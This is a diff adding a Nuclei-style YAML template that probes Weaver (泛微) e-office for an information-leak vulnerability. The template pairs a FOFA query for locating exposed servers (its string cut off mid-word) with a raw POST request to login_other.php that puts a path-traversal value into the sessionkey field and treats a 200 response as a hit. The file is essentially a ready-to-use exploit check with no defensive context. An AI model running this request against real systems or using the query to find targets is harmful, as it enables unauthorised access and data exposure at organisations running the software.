@@ -1,0 +1,30 @@
+id: poc-dhxermbt32y7gusk
+info:
+  name: 泛微e-office login_other存在信息泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dhxermbt32y7gusk'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dhxermbt32y7gusk
+    fofa: body="eoffice_loading_tip" || body="/eoffice10/client/web/" || ((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif" || (body="szFeatures" && body="eoffice") || heade
+http:
+- raw:
+  - 'POST /E-mobile/App/System/Login/login_other.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.2125.98 Safari/537.36
+
+    Content-Length: 61
+
+
+    diff=getuser&id=admin&sessionkey=\\..\\..\\webroot\\index.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
